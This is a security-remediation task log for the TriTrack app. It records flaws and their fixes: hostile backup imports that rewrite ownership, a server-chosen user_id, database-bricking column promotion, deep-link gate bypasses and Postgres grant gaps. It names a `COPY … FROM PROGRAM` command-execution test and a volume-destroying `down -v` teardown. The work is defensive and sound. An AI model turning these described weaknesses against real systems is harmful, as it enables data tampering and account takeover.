### Task 10.73 — K-1: the picked-`.zip` restore is J-1 on every table
**Status:** Done — 2026-08-16. §4.19's five clauses moved into
`tritrack_sync` (`UntrustedImportRules`) and applied to `ProjectMerger`, plus a
sixth this path needs — the merge is scoped to `manifest.projectId` — all keyed
on one new `MergeOrigin` parameter rather than the several that had to agree.
Each of the four measured facts is answered by a named clause: (a) the button
stays and the clock bound + consent gate are what stop the default-strategy
damage; (b) the clock check is deliberately *not* folded into `RowValidator`,
because the server runs it too and its answer to a bad clock differs on purpose;
(c) is the sixth clause; (d) the dedup stays and now reports
`rowsReattributed`. K-8 closed in the same pass, both halves. Security model
§4.19.2 is the rule; §4.19.1 rows 4 and 9 corrected and rows 2/3 re-verified.
`test/security/backup_restore_overwrite_test.dart` (29 tests) — every clause
neutralized in turn, each going red on its own. See report below.
**Model:** **Opus** — same class as 10.61; the rule extends rather than is re-derived.
**Depends on:** 10.61. **The most urgent item in the phase.**

`FilePicker` → `BackupArchive.decode` → `ProjectMerger.merge` takes `user_id`,
`owner_user_id`, `last_modified_by`, `origin_device_id`, `revision`,
`created_at`, `updated_at` and `deleted_at` verbatim from the file, across all
11 synced tables, with no prior-version capture and no field-by-field diff.
Reproduced live under the **default** strategy with `validate: true`.

**Four things measured in the gate that the fix must not get wrong:**

- **(a)** `preferIncoming` is not the defect. An unbounded `revision` wins
  `MergeResolver` outright, so removing the "Overwrite with backup" button fixes
  nothing.
- **(b)** `RowValidator` already runs here and stops none of it — it has never
  inspected the clock, `deleted_at` or authorship.
- **(c)** The merge is **not scoped to `manifest.projectId`**; one file rewrote
  the owner of an unrelated local project.
- **(d)** `IdentityTrust.emailMatchesPerson` is in force, so a `Users` row
  claiming the victim's address re-attributes the file's own rows to the victim.

§4.19's five clauses are the design answer already written down. The work is
applying them to a path that reaches **every table** rather than one row.

- **Fix the exposure claim, not only the code.** §4.19.1's deferral rests on "a
  file the user chose" — and `data_export_screen.dart:70-72` tells users the
  file is shareable by WhatsApp. A trust assumption contradicted by the
  product's own copy is a finding in its own right.
- **Fold in K-8**, which belongs to this path: §4.19 rule 4's consent gate
  writes a clock-only payload with no dialog while the UI says *"replaced as you
  confirmed — 0 values were changed."* That is **J-1's fourth defect reproduced
  inside J-1's own fix**, and it should be fixed by whoever is already holding
  this code.

#### Report (2026-08-16)

**The rule was moved, not re-derived.** §4.19's numbers and column lists lived
on `ObservationShare` — the encoder for the one payload format §4.19 happened
to be written against — which is precisely why a second import path could not
reach them. They are now `UntrustedImportRules` in `tritrack_sync`, and
`ObservationShare` references them. Security model §4.19.2 states how each
clause lands on an archive; §4.19 rule 4 gained the K-8 correction.

**One parameter, not five.** The merger took an `IdentityTrust` and nothing
else; every other trust decision was absent or separately settable, so the file
call site got the loosest setting of each. `MergeOrigin` is now the single
input and `IdentityTrust` derives from it. Clause 1's original lesson was *two
lists that were never the same list*; two parameters that must always agree are
that defect with a different shape, and the plumbing change is most of why this
one is closed rather than patched.

**Each of the four measured facts, answered by a named clause:**

- **(a)** The "Overwrite with backup" button **stays**, with a comment saying
  why removing it would have fixed nothing. What stops the default-strategy
  damage is the clause-3 bound and the clause-4 gate, which `preferIncoming`
  passes through identically. A test asserts the damage is refused under
  `lastWriteWins` specifically.
- **(b)** `RowValidator` still stops none of it, and the clock check is
  deliberately **not** folded into it — the server runs `RowValidator` on
  pushed rows and its answer to a bad clock is different *on purpose*
  (`ClockSkew.classify` writes the row anyway; it must not rewrite history it
  did not author). A test asserts every row of the hostile archive passes
  `RowValidator` unaided, so "validation is on" can never again read as
  reassurance.
- **(c)** The sixth clause: rows are scoped to `manifest.projectId`, on **both**
  origins — a check that runs only where it has already been exploited is how
  this class recurs. It immediately caught a real fixture mismatch in
  `schema_compatibility_test.dart`, where the manifest had never named the
  project its rows were in because nothing read it.
- **(d)** The email dedup **stays** — it is the only thing between "merged my
  own phone's export" and two of me — and now reports `rowsReattributed`
  alongside `usersDeduped`. Visibility is what it owed; removing it would have
  been the fifth wrong fix.

**The exposure claim, and the sweep it prompted.** §4.19.1 row 4's deferral is
corrected on the page rather than dropped, because the *reasoning* is the
lesson. Asked of every other row: **row 9 ("cloud backup — N/A, upload only")
is the same shape.** The code claim is true and re-verified; the verdict drawn
from it is not, because the linked folder is a place a third party can write a
file the user later picks. `auto_backup_section.dart` (deleted with the cloud backup, `3a9a2c8`) spends three
paragraphs on who can read that folder and says nothing about who can write to
it. Rows 2 and 3 were re-checked and hold (fresh `tag_id`, locally re-stamped
clock); row 7 is 10.77's. §4.19.1 now carries the general clause: **a verdict is
a claim, and a claim the UI contradicts is a finding, not a footnote.**

**K-8, both halves.** The exemption list has one written criterion — *does this
column move on every honest edit?* — which `created_at` and `origin_device_id`
fail and `last_modified_by` passes for a stated reason. And
`replicaUpdated`'s message now reads the outcome instead of assuming it, so an
update that destroyed nothing no longer claims a consent nobody was asked for.
A third defect of the same family surfaced while writing it and is fixed on the
rule rather than the path: a tombstone landing on a live row has `was == null`
and the obvious destructiveness test called it an addition. The share format
never reaches that branch, which is exactly why the predicate belongs on
`UntrustedImportRules` and not on the path that happens not to need it.

**Tests.** `test/security/backup_restore_overwrite_test.dart`, 29 tests:
§13.2's transcript line by line, a group per clause, a group for the four wrong
fixes, and `a genuine restore` — which is not a courtesy on this feature, since
a fix that quietly became "refuse everything" would be its own data-loss
finding. **Six neutralization runs** (clause 2, clause 3, clause 4's gate,
clause 4's prior-version capture, the project scope, clause 5's forcing) each
turned only the corresponding tests red. One of those runs also caught the
summarizer I was reading them through under-reporting failures, which is worth
recording: the neutralization is only evidence if the thing counting the reds
is itself checked.

**Full suite green** (864 passing). The one red elsewhere is
`server/test/support/database_coverage_guard_test.dart`, which fails identically
on a stashed clean tree — it is E-1's guard demanding a configured Postgres,
and there is none in this environment.

### Task 10.74 — K-2: no per-source rate limit in the deployment §4.1 mandates
**Status:** Done (2026-08-16) — **option 1**, recorded in Security Model §4.4.3.
An allowlist in `TRITRACK_TRUSTED_PROXIES` now additionally requires
`TRITRACK_PROXY_SOURCE_IDENTITY` = `probe-verified` (a measured
`proxied: PRESERVED` from `verify_source_identity.sh` **on that host**) or
`on-network-only`; anything else exits 78 naming the collapse. Qualified by a
probe run, not by an OS — no Linux host was measured and nothing claims one is
fine. Option 2 refused (no publish path on this host preserves addresses;
measured, control passing). Option 3 refused, with the denial of service
spelled out in §4.4.3's text: ten unauthenticated requests deny sign-in to the
whole deployment for 15 minutes, repeatably, with unattributable audit rows.
Consequence accepted and stated plainly — **on Docker Desktop nothing is
exposable at all**, and Phase 11 must not assume an exposed deployment exists.
`docker-compose.tls.yml` passes the variable through with no default (a fact
about the host, not the file); `shipped_defaults_test.dart` enforces that over
every compose file. Both TLS drills declare `on-network-only`, which is what
they are and is also their blind spot. Server suite green but for the known
`database_coverage_guard_test.dart` red (needs Postgres); `flutter test` 864
passing.
**Model:** **Opus** — a deployment decision, not a patch.
**Depends on:** 10.52, 10.62.

`verify_source_identity.sh`, run as a gate rather than `--report-only`, returns
`COLLAPSED` for the TLS overlay's off-host callers, with its negative control
passing in the same run. §4.4's limits become one bucket for every user and
`auth_audit_log.source_address` names a gateway. This is I-1 **in the only shape
this project is allowed to expose** — 10.62 closed the base/LAN shape properly.

The probe's own text is likely right that no Docker Desktop configuration fixes
this. **Three honest options, and there is no fourth:**

1. Qualify the exposable deployment as Linux-host-only, and require a passing
   `verify_source_identity.sh` before any exposure.
2. Find a publish path that preserves addresses on this host.
3. Accept the collapse explicitly, with the per-email fallback carrying the
   whole load, and say so in §4.4.2 including the denial-of-service consequence.

**"It might be fine on Linux" is not one of the three** — nobody has measured a
Linux host. Measure it or qualify it.

### Task 10.75 — K-4: `ServerIdentityAdopter` trusts a server-chosen `user_id`
**Status:** Done (2026-08-16)
**Model:** **Opus** — identity boundary.
**Depends on:** 10.6, 10.55.

An unvalidated server-chosen `user_id` is written into a primary key, into the
user column of all 11 synced tables including `Projects.owner_user_id`, into a
`User_Emails` binding and into the device's acting identity — each with
`revision + 1` — and the superseded local `Users` row is **hard-`DELETE`d** with
no `Sync_Conflicts` entry and no tombstone. No `RowValidator`, no authorization
check. No test drives a hostile `serverUserId`.

- The attack needs a hostile or compromised server, which is a real but bounded
  threat. **The honest-path variant needs no attacker at all:** two people
  sharing an institutional mailbox on one device are fused and one profile is
  destroyed. Fix for both.
- This is the client trusting the server the way §4.19 says nothing may trust an
  imported file. **Say explicitly why the server is or is not different**, and
  record it — the answer is not obvious and should not be implicit.

**Done 2026-08-16.** The answer is written as **§4.20**: *the server is the
authority on which id names an email, and is not an authority on anything that
follows from that id.* The first half is upheld, on three named grounds — an
authenticated session, the design-assigned role of §4.17/§4.18, and
`completeSignIn`'s bound to the address the **user typed**. The four things the
code had conflated with it are enforced separately:

1. `RowValidator` now runs on this path — **the last write path in the app that
   skipped it** — and gained the shape half of the bound it was missing
   (identifiers must be non-blank, within `maxPrimaryKeyLength`, and free of
   control characters), table-agnostically, so the merge and archive paths
   inherit it. The derived `user_email_id` is bounded in its own right.
2. A server id this device already holds for a **different person** is refused
   (accepted only if that row carries the signed-in address, a Phase 7
   placeholder, or the address as a recorded prior). Without it, a server that
   legitimately confirms the right email can still hand back a colleague's
   `user_id` and have this device reattribute the signing-in person's rows to
   them with a winning revision.
3. **The honest path, and it was not a trust question at all.**
   `_resolveLocalUserIds` folded in *every* local row carrying the signed-in
   address; it now applies to current addresses the same
   ambiguous-means-do-not-guess rule the prior-address branch beside it always
   applied. Only the active user is adopted when several match; the rest are
   held back untouched. The server names the id, the *device* chooses the
   targets — which is exactly why a section written about untrusted payloads
   never reached this defect.
4. The superseded `Users` row is captured to `Sync_Conflicts` before the hard
   delete, in the same transaction. The delete stays (a tombstone would sync
   the false claim that the person was deleted); what was wrong is that the
   argument for *not tombstoning* had been read as an argument for *not
   recording*.

Refusals throw `IdentityAdoptionRefused` from inside the transaction, so a
refused adoption leaves the database byte-identical and the device signed out.
27 tests in `test/security/server_identity_adoption_test.dart`, grouped
one-to-one onto §4.20's clauses with a negative control in each group. One
pre-existing test asserted the defect ("two local rows sharing the email both
fold in") and now asserts the rule.

### Task 10.76 — K-5: `UnknownColumnStore.promote` can brick the database
**Status:** Done — 2026-08-16. `Unknown_Columns` gained a `project_id` column
(part of its primary key), populated at every `hold`/`attach` call site from
the project already in scope there (`ProjectMerger._apply`'s
`backup.manifest.projectId`, `ProjectExporter.collect`'s `projectId`,
`SyncEngine._collectChangedRows`'s `projectId`); `attach` now filters on it, so
a value learned through one project is never carried into a different
project's own export or push — closing the cross-project channel for the
three globally-keyed tables. `hold` refuses entries past `maxEntries` (2000),
`maxColumnNameLength` (128) or `maxValueJsonLength` (8000 chars) outright, so
nothing unbounded can be stashed. `promote` never overwrites a column that
already holds a non-null value (defeats the migration-backfill-overwrite harm)
and wraps each entry in try/catch: a failure — malformed row key, a value that
will not bind, anything — moves the entry to a new bounded
`Unknown_Columns_Quarantine` table instead of leaving it to throw again on the
next launch, closing the unrecoverable-brick harm. An entry from before this
task (no `project_id` column at all) is purged on the first post-upgrade open,
consistent with the precedent `RowKeyMigration._purgeStaleUnknownColumns`
already set for this same table's `row_key` shape — nothing could be
recovered from it either way. `SyncEngine.hasHeldUnknownColumns` and its
caller (`sync_provider.dart`) took a `projectId` too, closing the follow-up
their own doc comment had already flagged. Tests added in
`schema_compatibility_test.dart`: project scoping, all three bounds, the
non-null-overwrite refusal, and the quarantine-not-repeat path (a value that
cannot bind, exercised twice to prove the second `promote()` pass finds
nothing left to retry). Full suite green (897 tests).
**Model:** Sonnet — the spec is clear; the consequence is not subtle.
**Depends on:** 10.18.

`promote` writes stashed values into real columns from `onOpen` on every launch:
no validation, no authorization, no clock, no conflict capture, and no bound on
entry count, column-name length or value size. **Nothing promotes today only
because a column must be unknown at stash time and declared at promote time — a
timing accident, not a control.**

Two harms arm on the next additive schema bump:

1. A stashed value overwriting a migration's own backfill (schema v4's
   `Tags.color_hex` `UPDATE` is the shape).
2. An unwritable value throwing inside `onOpen`, where the entry is deleted only
   *after* a successful update — **so the failure repeats every launch and the
   database never opens again.** That is unrecoverable data loss on a field
   device, from a value that arrived over sync.

Also: the store is not project-scoped, and `Users`, `User_Emails` and `Tags` are
globally keyed — a live cross-project channel. Held values ride outward on every
push and export, so a stash spreads device to device.

### Task 10.77 — K-3: the deep-link claims are false, and iOS must close before Phase 11
**Status:** Done — 2026-08-16. Three-line code fix, exactly as scoped:
`app_router.dart`'s `GoRouter` now sets `overridePlatformDefaultLocation:
true` (platform-independent — also covers macOS); `AndroidManifest.xml`'s
`MainActivity` carries `flutter_deeplinking_enabled = false`; `ios/Runner/
Info.plist` sets `FlutterDeepLinkingEnabled` to `false`, closing the iOS
receiver *before* Phase 11 gives it a reason to matter rather than after.
`splash_screen.dart:44-45`'s "non-skippable gate" comment was rewritten to
describe what the widget itself guarantees and name the platform-layer
controls that close the rest, instead of a claim the router's own default
behavior contradicted. `TriTrack_Security_Model.md` corrected: §4.19.1 row 7
(the deep-link table row), the sixth gate re-run's row-7 correction bullet,
and §13.6's K-3 write-up all now record the closure. While in the file,
also recorded task 10.76's already-landed closure of row 6 / K-5
(`UnknownColumnStore.promote`), whose doc rows still read "Open" — the same
staleness §12.11's rule exists to prevent, caught in passing rather than left
for the next gate to rediscover.
**Model:** Sonnet — the fix is three lines; the claims need rewriting.
**Depends on:** nothing. **Do the iOS half before Phase 11.**

§4.19.1's deep-link row and `splash_screen.dart:44-45` are both false as
written: the row's four sub-claims hold and its conclusion does not.
`AndroidManifest.xml:16` is `android:exported="true"`, `getInitialRoute()`
returns a `route` extra unconditionally, and go_router 17.3.0 prefers the
platform default over `initialLocation` without
`overridePlatformDefaultLocation: true`. Reproduced at hops 2–3 with a negative
control.

- The *exploit* is accepted under §5.4 (a malicious app on the device is a
  non-goal). **The claims are not** — correct them.
- Set `overridePlatformDefaultLocation: true` (or a `redirect:` re-asserting the
  identity gate), and `flutter_deeplinking_enabled=false` /
  `FlutterDeepLinkingEnabled=false`.
- **iOS is closed today only by the absence of a registered URL type — one
  layer. Phase 11's magic-link deep link is exactly what registers one.**

### Task 10.78 — K-6, K-9, K-10, K-11: containers, a reintroduced race, and two blind instruments
**Status:** Done — 2026-08-16.

- **K-6, fixed.** `sync_routes.dart` gained `_malformedContainerOutcome`
  (`rows` itself not a `Map` — string, number, list, `null` — now draws one
  `rows/?: invalid`) and `_malformedRowOutcomes`'s per-table condition was
  broadened from "a `List` containing a non-`Map` entry" to "not a `List` at
  all, or a `List` containing a non-`Map` entry." `decodeRows` itself stays
  deliberately lenient (a standing test asserts it tolerates malformed shapes
  without throwing) — the fix is at the outcome-reporting layer, the same
  place J-5 was fixed. **Why the enumeration didn't catch it:** 10.64
  enumerated the envelope's *fields* against a fixed defect matrix {wrong
  type, wrong shape, null, NUL byte, oversized} — `rows` was one of the
  fields tested, but only for being *absent or wrongly typed as a whole
  top-level key*, not for what shape its own contents took once present as a
  `Map`; "is the container itself shaped right, independent of any field
  inside it" was never a matrix cell. Tests: `sync_envelope_typing_test.dart`,
  new `K-6` group, 2 tests (both `skip: databaseSkipReason`, run and passing
  against a live Postgres for this task).
- **K-9, fixed.** `server/backup/backup.sh` and `restore.sh`'s check-then-
  `CREATE ROLE` replaced with the same unconditional-`CREATE`-swallow-the-
  duplicate shape `ensureServerAppRole` uses (`42710`/`23505`, or their text
  equivalents since a shell script only has psql's stderr to read). **Why the
  enumeration didn't catch it:** 10.66's rule was applied to the one instance
  10.69 was scoped to fix (`ensureServerAppRole`, in Dart) — adopting a rule
  and grepping the repo for every other instance of the pattern it
  generalizes are different acts, and the second one never happened in the
  same commit that did the first, so the two pre-existing shell instances of
  the identical check-then-act shape were never looked at.
- **K-10, fixed.** `server_app_role_test.dart`'s `COPY … FROM PROGRAM` case now
  asserts `isA<ServerException>().having((e) => e.code, 'SQLSTATE', '42501')`
  instead of `throwsA(anything)`. **Why the enumeration didn't catch it:**
  10.69's acceptance criterion was "the test stops flaking," and a test
  becoming deterministic was taken as evidence it was also measuring the
  right thing — determinism and precision are different properties, and
  fixing the first gave no reason for anyone to separately ask what a
  guaranteed-repeatable `throwsA(anything)` actually proves.
- **K-11, fixed, both halves.** (a) `verify_instrument_unchecked_returns.py`'s
  default scan now covers `server/backup/` alongside `scripts/`; a second
  regex (`NONEMPTY_AND_FAIL_IS_PASS`) catches the inverted
  `[ -n "$VAR" ] && fail` spelling without flagging the safe, dominant
  `[ -n "$VAR" ] || fail` idiom; and the success line names the directories
  scanned and states plainly that Python instruments are out of scope, rather
  than implying a complete sweep. Selftest extended with a fixture for the
  inverted spelling and the safe `-n ... || fail` idiom (both pass). (b)
  `project_merger.dart`'s `_buildUserRemap` no longer casts `backup`'s rows
  with naked `as String?`/`as String` — new file-level `_asStringOrNull`/
  `_asStringOrEmpty` helpers skip a malformed row for remap purposes only,
  leaving it to `RowValidator` in `_plan` (which runs after, and which this
  bug reached *before*) to actually rule on it, rather than crashing the
  whole merge on one bad `user_id`. **Why the enumeration didn't catch it:**
  neither tool was checked against itself. (a) was written to catch a class
  of defect but its own scan scope was never audited the way it audits its
  target — "`scripts/*.sh`" was where the one known instance lived, not a
  scope derived from "everywhere this class of file could exist." (b) 10.67's
  own "Method" paragraph named `lib/data/sync/**` as one of the directories
  three parallel research agents covered, but the verdict table that same
  task's acceptance criterion requires — "a table of every site" — has no row
  for it at all; the paragraph's claim was never checked against the table it
  was supposed to summarize. Tests: `project_merger_test.dart`, 1 new test in
  the cross-device-dedup group, proving a non-string `user_id` is refused by
  `RowValidator` rather than crashing the merge (confirmed the pre-fix cast
  throws via a standalone repro before writing the fix).

Full suite re-run: app 898 tests, `packages/tritrack_sync` 179 tests, server
466 tests against a live Postgres (one `audit_log_test.dart` failure was a
pre-existing concurrency flake under `dart test`'s parallel file execution,
confirmed by an immediate clean re-run) — all green.

**Original brief, small individually; the pattern across them is the point.**

- **K-6:** a malformed `rows` **container** is still accepted silently — string,
  number, list, null, or a known table whose value is not a list, all answer
  `200 applied=0 outcomes={}`, indistinguishable from an honest empty push.
  10.64 enumerated every *field* and not every *container*. J-5's shape one
  level up, found immediately below the pass that closed J-5.
- **K-9:** 10.69's `CREATE ROLE` race **reintroduced in `backup.sh` by the same
  commit that adopted 10.66's rule.** Second time a task has reintroduced the
  class it was closing (10.54 was the first).
- **K-10:** `throwsA(anything)` on the test guarding J-3 — a check that cannot
  distinguish the right failure from any other.
- **K-11:** the new unchecked-return detector **never reads the file the class
  was named after**, and 10.67's sweep table omits `lib/data/sync/`.

**Acceptance:** each fixed, plus one sentence per item on why the enumeration
that should have caught it did not.

### Task 10.88 — Measure a candidate host, because the exposable deployment has none
**Status:** **Done (2026-08-17) — a host is licensed for the first time.**
`verify_source_identity.sh --assisted`, Stage B, 13 checks passed. **Both shapes
PRESERVED** from real off-host callers:

```
direct   (base compose, published port): PRESERVED  [192.168.0.153 / 192.168.0.88]
proxied  (TLS overlay, off-host caller): PRESERVED  [192.168.0.153 / 192.168.0.88]
```

**Qualified configuration** (§4.4.3 qualifies a probe *run*, not a platform):
Ubuntu 24.04.3 ARM64 under Parallels Desktop on an Apple Silicon Mac,
bridged networking, Docker installed natively from get.docker.com (not Docker
Desktop). Off-host callers: iPhone `192.168.0.153` and Mac `192.168.0.88` on a
home LAN.

On this host, and only this host, the following may now be declared:
`TRITRACK_TRUSTED_PROXIES=peer-verified` and
`TRITRACK_PROXY_SOURCE_IDENTITY=probe-verified`.

**Two things this does and does not settle.** It settles the shape — a native
Linux kernel with Docker preserves the caller's address through port publishing,
which is the property Docker Desktop lacks and the reason no host could be
licensed before. It does **not** license a cloud VM; that is the same
arrangement with a different NIC and very likely behaves identically, but the
whole discipline of 10.74 and 10.110 is that "very likely" is not a
measurement. Re-run the probe on whatever host the beta actually uses.

**Route to the result, worth keeping.** The first run on this host reported
COLLAPSED and was wrong — task 10.110's defect. A first attempt on a campus
network failed because university Wi-Fi isolates clients from each other, which
is a real constraint on where this measurement can be taken at all. Neither the
probe's original verdict nor a prediction of mine was the thing that produced
the answer; two real devices were.
**Model:** Sonnet — the work is measurement, not design.
**Depends on:** 10.74, and **10.110, which was the real blocker and is now
Done.** Until 10.110 the probe could not return `PRESERVED` on any Linux host,
so this task could not have succeeded whatever host it was pointed at.

**Read this before running it (task 10.110, §4.4.4).** The run that licenses a
host is `scripts/verify_source_identity.sh --assisted`, and it **needs a human
with two devices** — it prints one URL per device, waits, and issues the verdict
itself from what arrives. Without `--assisted` the probe only screens and cannot
return `PRESERVED` at all. Two visits from the same device look exactly like a
collapsed publish path and the probe refuses rather than guessing, so bring an
actual second machine. On the Ubuntu 24.04 ARM64 / Parallels-bridged / native
Docker candidate, 10.110 already recorded device 1 arriving as a preserved
`192.168.0.88` on both shapes; what is owed here is the second device and the
resulting `PRESERVED` on the `proxied` line.

10.74 made the exposable deployment conditional on a passing
`scripts/verify_source_identity.sh` run against the host it will run on, and
refused to let the repository vouch for a machine it has never seen. Correct —
and it leaves TriTrack's exposable deployment existing **as a procedure, not as
a machine**. §4.4.3 says Phase 11 must not assume one exists.

**The gate does not care** — nothing is exposed, so nothing is at risk. **The
March beta cares completely**, because a single-team beta needs a reachable
server, and there is currently no host known to support one.

- Stand up a candidate host — a Linux VM, cloud or otherwise — and run the probe
  against it **with `--assisted` and two real off-host devices**. That is the
  whole task.
- **Report the result either way.** A host that also collapses is a valuable
  answer and changes the hosting decision; a host that passes converts the
  procedure into a deployment.
- If it passes, record *which* host and *which* publish path, so the claim is
  about a measured configuration rather than about Linux in general. "Linux is
  fine" is the assumption 10.74 specifically refused to write down.
- Feed the answer into `SERVER_DEPLOYMENT_PRIMER.md` §C2 and to whoever is
  taking the hosting decision — it is a hard input to a choice being made now.

### Task 10.89 — The demoted role cannot see a table created after it was granted
**Status:** Done (2026-08-16)
**Model:** Sonnet
**Depends on:** 10.63, 10.69. **Blocks 10.51, which blocks the gate.**

`server_app_role_test.dart`'s *"DML on an existing table still works after
assuming the role"* fails with `42P01: relation "tritrack_test_10_63_probe" does
not exist`. Reproduced twice on clean Docker Postgres, so not order-dependent
flake. The preceding test passes, so the demotion itself works — the probe table
created in `setUp` on the admin connection is not visible to the demoted one.

**Establish which of these it is before fixing anything**, because two of the
three are harmless and one is a live deployment defect:

1. **A test-harness defect** — the probe created `TEMPORARY` (session-scoped, so
   invisible to a second connection), or created in an uncommitted transaction,
   or a `search_path` difference under the demoted role. Harmless; fix the test.
2. **A grant that does not cover future objects.** `GRANT … ON ALL TABLES IN
   SCHEMA public` applies **only to tables that exist when it runs.** Any table
   created afterwards has no privileges for `tritrack_app` unless
   `ALTER DEFAULT PRIVILEGES` was also set. **This is a real deployment hazard
   independent of this failure** — it means the next migration that adds a table
   produces a server that cannot read its own new table, in production, after
   the demotion 10.63 introduced. 10.68's Discovered Scope already recorded the
   sequence-grant version of exactly this shape (`permission denied for sequence
   …_id_seq`, fixed by adding a sequence grant) — **the same omission, one object
   type over, and nobody asked whether it generalised.**
3. Something a recent commit changed in role or grant setup.

**Check (2) regardless of what caused this test to fail.** If the answer is that
grants do not cover future objects, that is a finding in its own right and needs
fixing with `ALTER DEFAULT PRIVILEGES` plus a test that creates a table *after*
`ensureServerAppRole` and exercises it — which is what this test was presumably
trying to be.

- `42P01` is *undefined_table*, not `42501` *insufficient_privilege*, which
  points at (1) rather than (2). **Do not let that end the investigation** — it
  makes (1) the likely cause of *this failure* and says nothing about whether
  (2) is also true.
- **Acceptance:** the cause is named with evidence, not inferred; the grant
  coverage question is answered explicitly either way; a table created after the
  role exists is exercised by a test that would fail if the grant regressed.

**Implementation (2026-08-16).** Both questions above, answered separately —
they turned out to be independent, and conflating them would have hidden the
real bug behind a fix that didn't touch it.

- **Cause of *this* failure, named with evidence: (1), a test-harness defect,
  confirmed live, not inferred from the SQLSTATE alone.**
  `postgres_sync_test.dart`'s test schema was named `'tritrack_test'` —
  which is exactly `.env.example`'s sample `POSTGRES_USER` value. Postgres's
  `"$user"` search_path entry resolves to the connection's *session user*; on
  a database where `POSTGRES_USER` is literally `tritrack_test` (this dev
  setup), any unqualified statement on *any* connection in the suite prefers
  a schema named `tritrack_test` over `public` for as long as that schema
  exists. `postgres_sync_test.dart`'s `resetSchema()` creates and drops a
  schema of exactly that name many times a second while it runs; when
  `server_app_role_test.dart`'s admin connection ran its unqualified
  `CREATE TABLE tritrack_test_10_63_probe` at the wrong instant, the table
  landed in the transient `tritrack_test` schema instead of `public`, and
  vanished under that file's next `DROP SCHEMA … CASCADE` moments later —
  `42P01`, not `42501`, because by the time the demoted connection's `INSERT`
  ran the table was genuinely gone. Reproduced deterministically running only
  those two files together (`dart test -j 2`); cleared on ten consecutive
  full-suite runs after renaming the schema to
  `'tritrack_postgres_sync_test'`, matching every sibling file's naming
  convention (all of which already used a distinctive suffix — this file was
  the one exception). Confirmed by the negative control: reverting only the
  rename reproduced the failure again immediately.
- **The general question, answered independently of the above and regardless
  of what caused the red test: `GRANT … ON ALL TABLES/SEQUENCES IN SCHEMA
  public` does not cover objects created afterwards — never, by Postgres
  design, no matter how often it is re-run.** Only two object classes exist
  in this schema (tables, sequences — no views, functions, or types), and
  both were checked. Today's mitigation is call-site discipline:
  [PostgresMigrations.run] always calls `ensureServerAppRole` again,
  unconditionally, immediately after any DDL it runs, so the *current*
  call graph closes the gap for the one path that creates tables in this
  codebase. That is a convention, not a guarantee — a future DDL path that
  doesn't funnel through `PostgresMigrations.run`, or a reordering, would
  silently reopen it with nothing to catch the regression. Closed
  structurally with `ALTER DEFAULT PRIVILEGES IN SCHEMA public` for both
  `TABLES` and `SEQUENCES`, so Postgres itself extends the same privileges to
  anything `tritrack_app`'s granting role creates in `public` from now on,
  independent of any second call. New test in `server_app_role_test.dart`:
  creates a table *after* `ensureServerAppRole` has already run, with no
  second grant call, and exercises DML on it as the demoted role — verified
  to fail with `42501` on a fresh database when the `ALTER DEFAULT
  PRIVILEGES` statements are reverted (not a vacuous pass), and to pass with
  them present.
- **Discovered Scope: `ALTER DEFAULT PRIVILEGES` made a pre-existing race in
  the un-retried `GRANT … ON ALL TABLES` line surface for the first time.**
  Adding two more catalog-mutating statements to `ensureServerAppRole` — a
  function every Postgres-backed test file calls from its own `setUp` —
  shifted the full suite's timing enough that `GRANT … ON ALL TABLES IN
  SCHEMA public` itself started failing with `XX000` "tuple concurrently
  updated" (a losing `pg_class.relacl` catalog update, not a SQLSTATE with a
  recognisable "someone already did this" meaning like the `CREATE ROLE`
  race task 10.69 fixed). Per 10.66's standing rule — fix the class, not the
  instance that got caught — every catalog-mutating statement in the
  function (both pre-existing `GRANT`s and both new `ALTER DEFAULT
  PRIVILEGES` calls) now retries through `_retryOnConcurrentCatalogUpdate`,
  matched on SQLSTATE `XX000` *and* the message text (an unqualified `XX000`
  catch would mask unrelated internal errors). Verified with three
  consecutive full-suite runs against a freshly recreated database, 467/467
  green each time (up from 465 before this task, for the two new tests).

### Task 10.90 — The gate stack carries state between runs, and nothing checks it
**Status:** Done (2026-08-16)
**Model:** Sonnet
**Depends on:** 10.42, 10.65. **Blocks 10.51, which blocks the gate.**

7 of 11 instruments failed because `tritrack-gate_tritrack_postgres_data`
survived an earlier run holding roles that predate the current `.env`. The gate
server never got a database connection, so every instrument calling
`gate_wire.py`'s `preflight()` received an empty body and threw a
`JSONDecodeError`.

**Not a security finding, and it fails safe** — the run went red, which is the
correct direction. Three things still need doing, and the third is the reason
this is a task rather than a `docker volume rm`.

1. **Start from known state.** `gate_smoke_test.sh` should bring its stack up
   from a fresh volume, or verify the volume matches the credentials it is about
   to use. A gate whose database persists across runs is measuring a
   configuration nobody specified.
2. **Never `-v` without `-p` scoping.** F15 destroyed the developer's Postgres
   volume exactly once, and the discipline since has been per-project names.
   Any teardown this task adds must be provably scoped to the gate project —
   verified by rendering the command, not by reading it.
3. **Report the condition, not the stack trace.** `preflight()` exists because
   of H-2, to stop instruments running against a server that cannot answer. It
   fired, but it surfaced `JSONDecodeError` rather than *"the gate server has no
   database."* A self-check that cannot say what it found sends the next person
   diagnosing Python instead of Postgres. Make it name the condition.

**The class question, and the one worth actual thought:** stale state made
instruments **fail** here. **Could stale state make one pass?** Enumerate every
instrument against that question with a verdict each. The shape to look for is a
negative control satisfied for the wrong reason — a volume predating a
remediation could hold roles, rows or grants under which a check reports HELD
without the current code doing anything. §12's I-3 was a control measured in a
configuration that disabled it; this is the same family, arriving by drift
rather than by design.

- **Acceptance:** the smoke run starts from known state and says so; a
  deliberately stale volume produces a message naming the database, not a
  traceback; the pass-for-the-wrong-reason enumeration is written down with a
  verdict per instrument.

**Closed 2026-08-16.**

1. **Known state.** `gate_smoke_test.sh` now runs `"${COMPOSE[@]}" down -v`
   (the same `COMPOSE` array that already carries `-p tritrack-gate`) before
   `up`, and prints both the intent and the rendered command
   (`+ docker compose -p tritrack-gate -f docker-compose.yml -f
   docker-compose.e2e.yml down -v`) so every run is provably starting from a
   volume-less state rather than trusting a prior run's leftovers.
2. **F15 trap — verified live, not read.** Before touching the script, the
   render was executed directly against a repo with *both* a stale
   `tritrack-gate_tritrack_postgres_data` volume (reproducing 10.51's exact
   finding) and the developer's own `tritrack_tritrack_postgres_data` volume
   present. `docker compose -p tritrack-gate ... down -v` removed only the
   first; the second was confirmed still present immediately after, by
   `docker volume ls`, not by re-reading the script.
3. **Name the condition.** `gate_wire.py`'s `preflight()` used
   `json.loads(raw or b"{}")` with no guard, and the actual failure mode
   isn't an empty body — `bin/server.dart` only mounts the auth router
   `if (withAuthService != null)` (i.e. once Postgres opens), so with no DB
   `/auth/magic-link` 404s via shelf_router's own default handler, which
   sends a **non-empty, non-JSON, `text/plain` body** (`"Route not found"`).
